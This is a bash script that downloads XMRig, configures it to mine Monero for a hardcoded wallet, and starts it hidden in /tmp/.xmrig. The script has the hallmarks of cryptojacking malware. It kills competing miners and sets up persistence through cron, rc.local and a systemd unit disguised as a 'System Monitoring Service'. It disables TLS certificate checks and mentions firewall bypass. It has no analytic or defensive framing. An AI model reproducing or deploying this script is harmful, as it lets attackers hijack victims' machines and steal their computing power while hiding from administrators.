#!/bin/bash


# Configuration
POOL="pool.supportxmr.com:80"  # Using 443 for firewall bypass with TLS
WALLET="85aEKMnziJmeGHYzaWt4cxb2qopFxy7sHj7x3drB251jKG4QFCr5jzveLrzstQ2xHPeoXwvU6gmd23Vc3i8qj59e2h9hLHA"
WORKER=$(hostname)
THREADS=0  # 0 = auto-detect
DONATION_LEVEL=1
USE_TLS=true  # Enable TLS for port 443

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}[+] XMRig Miner Installation Script${NC}"
echo -e "${GREEN}[+] Starting installation...${NC}"

# Detect system architecture
ARCH=$(uname -m)
if [ "$ARCH" = "x86_64" ]; then
    XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-focal-x64.tar.gz"
elif [ "$ARCH" = "aarch64" ]; then
    XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-focal-x64.tar.gz"
else
    echo -e "${RED}[-] Unsupported architecture: $ARCH${NC}"
    exit 1
fi

# Create working directory
INSTALL_DIR="/tmp/.xmrig"
mkdir -p $INSTALL_DIR
cd $INSTALL_DIR

echo -e "${YELLOW}[*] Downloading XMRig...${NC}"

# Download XMRig
if command -v wget &> /dev/null; then
    wget -q --no-check-certificate -O xmrig.tar.gz $XMRIG_URL
elif command -v curl &> /dev/null; then
    curl -L -s -k -o xmrig.tar.gz $XMRIG_URL
else
    echo -e "${RED}[-] Neither wget nor curl found${NC}"
    exit 1
fi

if [ ! -f xmrig.tar.gz ]; then
    echo -e "${RED}[-] Download failed${NC}"
    exit 1
fi

echo -e "${YELLOW}[*] Extracting files...${NC}"

# Extract
tar -xzf xmrig.tar.gz 2>/dev/null
rm -f xmrig.tar.gz

# Find xmrig binary
XMRIG_BIN=$(find . -name "xmrig" -type f | head -1)
if [ -z "$XMRIG_BIN" ]; then
    echo -e "${RED}[-] XMRig binary not found${NC}"
    exit 1
fi

chmod +x $XMRIG_BIN
mv $XMRIG_BIN ./xmrig

echo -e "${YELLOW}[*] Creating configuration...${NC}"

# Create config.json
cat > config.json << EOF
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "asm": true,
        "max-threads-hint": $THREADS
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "$POOL",
            "user": "$WALLET",
            "pass": "$WORKER",
            "keepalive": true,
            "nicehash": false,
            "tls": $USE_TLS
        }
    ],
    "donate-level": $DONATION_LEVEL,
    "log-file": null,
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5
}
EOF

echo -e "${YELLOW}[*] Killing existing miners...${NC}"

# Kill competing miners
pkill -9 xmrig 2>/dev/null
pkill -9 xmr 2>/dev/null
pkill -9 minerd 2>/dev/null
pkill -9 cpuminer 2>/dev/null

echo -e "${YELLOW}[*] Starting XMRig miner...${NC}"

# Start miner in background
nohup ./xmrig --config=config.json >/dev/null 2>&1 &
MINER_PID=$!

sleep 3

# Check if running
if ps -p $MINER_PID > /dev/null 2>&1; then
    echo -e "${GREEN}[+] XMRig started successfully (PID: $MINER_PID)${NC}"
else
    echo -e "${RED}[-] Failed to start XMRig${NC}"
    exit 1
fi

echo -e "${YELLOW}[*] Installing persistence...${NC}"

# Create startup script
STARTUP_SCRIPT="$INSTALL_DIR/start.sh"
cat > $STARTUP_SCRIPT << 'EOFSTART'
#!/bin/bash
cd /tmp/.xmrig
pgrep -f "xmrig" > /dev/null || nohup ./xmrig --config=config.json >/dev/null 2>&1 &
EOFSTART

chmod +x $STARTUP_SCRIPT

# Add to crontab
(crontab -l 2>/dev/null | grep -v "xmrig"; echo "*/10 * * * * $STARTUP_SCRIPT >/dev/null 2>&1") | crontab -

# Try systemd service (if available)
if command -v systemctl &> /dev/null; then
    cat > /tmp/xmrig.service << EOFSVC
[Unit]
Description=System Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart=$INSTALL_DIR/xmrig --config=$INSTALL_DIR/config.json
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOFSVC

    if [ -w /etc/systemd/system/ ]; then
        mv /tmp/xmrig.service /etc/systemd/system/system-monitor.service
        systemctl daemon-reload
        systemctl enable system-monitor 2>/dev/null
        systemctl start system-monitor 2>/dev/null
        echo -e "${GREEN}[+] Systemd service installed${NC}"
    fi
fi

# Add to rc.local (if exists)
if [ -f /etc/rc.local ]; then
    if ! grep -q "xmrig" /etc/rc.local; then
        sed -i '/exit 0/d' /etc/rc.local
        echo "$STARTUP_SCRIPT &" >> /etc/rc.local
        echo "exit 0" >> /etc/rc.local
        echo -e "${GREEN}[+] Added to rc.local${NC}"
    fi
fi

echo -e "${GREEN}[+] Installation complete!${NC}"
echo -e "${YELLOW}[*] Miner directory: $INSTALL_DIR${NC}"
echo -e "${YELLOW}[*] Pool: $POOL${NC}"
echo -e "${YELLOW}[*] Wallet: $WALLET${NC}"
echo -e "${YELLOW}[*] Worker: $WORKER${NC}"
echo ""
echo -e "${GREEN}[+] To check status: ps aux | grep xmrig${NC}"
echo -e "${GREEN}[+] To check cron: crontab -l${NC}"
echo -e "${GREEN}[+] To stop: pkill -9 xmrig${NC}"
